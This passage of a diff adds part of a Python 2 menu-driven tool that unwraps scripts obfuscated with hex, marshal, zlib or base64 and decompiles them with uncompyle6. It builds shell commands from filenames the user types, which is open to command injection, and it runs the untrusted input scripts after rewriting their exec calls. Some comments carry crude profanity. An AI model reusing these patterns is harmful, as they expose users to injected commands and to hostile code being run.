+    bk = bk.replace('exec("', '') or bk.replace("exec('", '')
+    bk = bk.replace('").decode("hex")', '') or bk.replace("').decode('hex')", '')
+    en = str(bk).decode('hex')
+    ff = f + 'c'
+    open(ff, 'w').write(en)
+    nm = ('').join(f.split('.')[:1]) + '-dec.py'
+    os.rename(ff, nm)
+    run('file berhasil di decrypt menjadi %s ' % nm)
+
+
+def unmarsh():
+    jalan(p + 31 * '\xe2\x95\x90' + h + '[' + bm + 'UNMARSH' + h + ']' + p + '>', 0.008)
+    print h + '\nMenu ' + p + ':\n [' + h + '1' + p + ']. Automatic Detection Version Script\n [' + h + '2' + p + ']. Back To Menu'
+    try:
+        pil = raw_input(h + '[' + k + '?' + h + ']' + p + ' Choice--> ')
+    except IOError:
+        unmarsh()
+
+    if pil == '1':
+        pass
+    else:
+        if pil == '2':
+            menu()
+        else:
+            print h + '[' + m + '!' + h + ']' + p + ' Choose the right one'
+            unmarsh()
+        cek = 1
+        try:
+            print h + '[' + k + '#' + h + ']' + p + ' For Example : /path/marsh.py'
+            file = raw_input(h + '[' + k + '?' + h + ']' + p + ' Input File : ')
+            f = open(file, 'r').readlines()
+            for i in range(len(f)):
+                if f[i][0:4] == 'exec':
+                    if f[i][19] == 'b':
+                        cek = 3
+                    elif f[i][20] == 'c':
+                        cek = 2
+                    else:
+                        cek = 1
+
+        except IndexError:
+            print h + '[' + m + '!' + h + ']' + p + ' Program Error!!!'
+            sys.exit()
+        except KeyboardInterrupt:
+            print h + '[' + k + '^' + h + ']' + p + ' ctrl+c \n'
+            print h + '[' + k + '#' + h + ']' + p + ' Exit!!!\n'
+            time.sleep(3)
+            sys.exit()
+        except EOFError:
+            print h + '[' + k + '^' + h + ']' + p + ' ctrl+d \n'
+            print h + '[' + k + '#' + h + ']' + p + ' Exit!!!\n'
+            time.sleep(3)
+            sys.exit()
+        else:
+            try:
+                string = open(file, 'r').read()
+            except IOError:
+                print '\n' + h + '[' + m + '!' + h + ']' + p + ' File Not Found'
+                raw_input(h + '[' + k + '^' + h + ']' + p + ' Press Enter to Return to the menu ')
+                os.system('clear')
+                menu()
+
+    if cek == 2:
+        py = 'python2'
+        dec = 'decompile(2.7, x, stdout)'
+        sys.stdout.write(h + '[' + k + '#' + h + ']')
+        jalan(p + ' check the script version', 0.1)
+        time.sleep(1.5)
+        print '\n' + h + '[' + m + '*' + h + ']' + p + ' python version 2 was detected'
+        time.sleep(1)
+        try:
+            x = re.search('((?<![\\\\])[\\\'"])((?:.(?!(?<![\\\\])\\1))*.?)\\1', string).group()
+        except Exception as e:
+            raise e
+
+    else:
+        if cek == 3:
+            py = 'python3'
+            dec = 'decompile(3.8, x, stdout)'
+            sys.stdout.write(h + '[' + k + '#' + h + ']')
+            jalan(p + ' check the script version', 0.1)
+            time.sleep(1.5)
+            print '\n' + h + '[' + m + '*' + h + ']' + p + ' python version 3 was detected'
+            time.sleep(1)
+            try:
+                x = 'b' + re.search('((?<![\\\\])[\\\'"])((?:.(?!(?<![\\\\])\\1))*.?)\\1', string).group()
+            except Exception as e:
+                raise e
+
+        else:
+            print h + '[' + m + '!' + h + ']' + p + ' File Not Suport'
+            raw_input(h + '[' + k + '^' + h + ']' + p + ' Press Enter to Return to the menu ')
+            menu()
+        fileout = open('un.py', 'w')
+        fileout.write('from sys import stdout\nfrom uncompyle6.main import decompile\nimport marshal\n\n')
+        fileout.write('x = marshal.loads(' + x + ')\n')
+        fileout.write(dec)
+        fileout.close()
+        load(h + '[' + k + '#' + h + ']' + p + ' Unmarshal process Wait a minute ...')
+        sp.call(py + ' un.py > unpyc/dec.py', shell=True, stderr=sp.STDOUT)
+        os.system('rm un.py')
+        os.system('clear')
+        time.sleep(1)
+        delay = open('unpyc/dec.py', 'r').readlines()
+        for x in range(len(delay)):
+            jalan(delay[x], 0.0001)
+
+    print '\n\n' + h + '[' + k + '#' + h + ']' + p + ' Successfully Decompiled'
+    print h + '[' + k + '#' + h + ']' + p + ' file saved : unpyc/dec.py'
+    ask = raw_input(h + '[' + k + '?' + h + ']' + p + ' Decompile Again? y/t ')
+    if ask == 'y' or ask == 'Y':
+        menu()
+    elif ask == 't' or ask == 'T':
+        sys.exit()
+    else:
+        print h + '[' + m + '!' + h + ']' + p + ' Choose the right one ' + m + '!!!'
+        raw_input(h + '[' + k + '^' + h + ']' + p + ' Press Enter to Return to the menu ')
+        os.system('clear')
+
+
+def pyc():
+    print m + '[' + p + '#' + m + ']' + p + ' For Example : /path/marsh.py'
+    f = raw_input(m + '[' + p + '?' + m + ']' + p + ' Enter Your File : ')
+    from py_compile import compile
+    compile(f)
+    load(m + '[' + p + '#' + m + ']' + p + ' Compile process Wait a minute ...')
+    jalan('\n' + m + '[' + p + '#' + m + ']' + p + ' file successfully compiled', 0.01)
+    print '\n' + m + '[' + p + '#' + m + ']' + p + (' File Saved: {}c').format(f)
+    ask = raw_input(m + '[' + p + '?' + m + ']' + p + ' Compile Again? y/t >> ')
+    if ask == 'y' or ask == 'Y':
+        menu()
+    elif ask == 't' or ask == 'T':
+        sys.exit()
+    else:
+        print m + '[' + m + '!' + m + ']' + p + ' Choose the right one ' + m + '!!!'
+        raw_input(m + '[' + p + '^' + m + ']' + p + ' Press Enter to Return to the menu ')
+        os.system('clear')
+        menu()
+
+
+def unpyc():
+    print m + '[' + p + '#' + m + ']' + p + ' For Example : /path/file.pyc'
+    f = raw_input(m + '[' + p + '?' + m + ']' + p + ' Enter Your File : ')
+    try:
+        open(f, 'r').read()
+    except IOError:
+        print m + '[' + m + '!' + m + ']' + p + ' File Not Found'
+        raw_input(m + '[' + p + '^' + m + ']' + p + ' Press Enter to Return to the menu ')
+        menu()
+    else:
+        load(m + '[' + p + '#' + m + ']' + p + ' Decompile process Wait a minute ...')
+        try:
+            os.system('uncompyle6 ' + f + '> unpyc/jadi.py')
+        except Exception as e:
+            print m + '[' + m + '!' + m + ']' + p + ' Failed to decompile because : ' + e
+
+    print '\n\n' + m + '[' + p + '#' + m + ']' + p + ' Successfully Decompiled'
+    print m + '[' + p + '#' + m + ']' + p + ' file saved : unpyc/jadi.py'
+    ask = raw_input(m + '[' + p + '?' + m + ']' + p + ' Decompile Again? y/t >> ')
+    if ask == 'y' or ask == 'Y':
+        menu()
+    elif ask == 't' or ask == 'T':
+        sys.exit()
+    else:
+        print m + '[' + m + '!' + m + ']' + p + ' Choose the right one ' + m + '!!!'
+        raw_input(m + '[' + p + '^' + m + ']' + p + ' Press Enter to Return to the menu ')
+        os.system('clear')
+        menu()
+
+
+def mzb():
+    print 'Decompile Marshal,Zlib,Base64'
+    a = raw_input('File : ')
+    b = open(a).read().replace('exec(', 'x = ').replace('))))', ')))')
+    note = 'DECOMPILED BY MHANK BARBAR'
+    c = open('mi.py', 'w')
+    if 'marshal' in b:
+        c.write('from sys import stdout\nfrom uncompyle6.main import decompile\n' + b + '\ndecompile(2.7, x, stdout)')
+        c.close()
+    elif 'marshal' not in b:
+        c.write(b + '\nprint (x)')
+        c.close()
+    d = a.replace('.py', '-d.py')
+    os.system('python2 mi.py > ' + d)
+    e = open(d).read()
+    f = open(d, 'w')
+    f.write(e + ' \n\n\n\t' + note)
+    f.close()
+    os.system('rm -rf mi.py')
+    print '\x1b[31;1m[\x1b[0;37m+\x1b[31;1m]\x1b[0;37m File saved as\x1b[32;1m ' + d
+    print 'Mau Dec Lagi Y or N ?'
+    cuk = raw_input('Pilih : ')
+    if cuk == 'y':
+        mzb()
+    elif cuk == 'n':
+        exit()
+
+
+def zl():
+    print 'Decompile Zlib'
+    a = raw_input('File : ')
+    b = open(a).read().replace('exec', 'print')
+    c = open('ma.py', 'w')
+    if 'zlib' in b:
+        c.write('# Bacod\n' + b + '# Loe Kontol')
+        c.close()
+    elif 'zlib' not in b:
+        c.write(b + '\nprint (print)')
+        c.close()
+    d = a.replace('.py', '-d.py')
+    os.system('python2 ma.py > ' + d)
+    e = open(d).read().replace('# uncompyle6 version 3.6.2', '# Versi Unkompel 0.0 :v').replace('# Embedded file name: ', '# Ini Nih:v ').replace('# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:28:22)', '# Decompel By Mhank BarBar Gans').replace('# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://', 'Halo Om').replace('# Python bytecode 2.7', '# Piton Bitkode 2.7')
+    f = open(d, 'w')
+    f.write('# Suksess Decompile \xe2\x9c\x93 \n' + e)
+    f.close()
+    os.system('rm -rf ma.py')
+    print 'File saced as ' + d
+    sys.exit()
+
+
+def exit():
+    run('thanks for using this tools Dear:)')
+    sys.exit()
+
+
+if __name__ == '__main__':
+    if os.path.exists('unpyc'):
+        menu()
+    else:
+        os.system('mkdir unpyc')
+        menu()
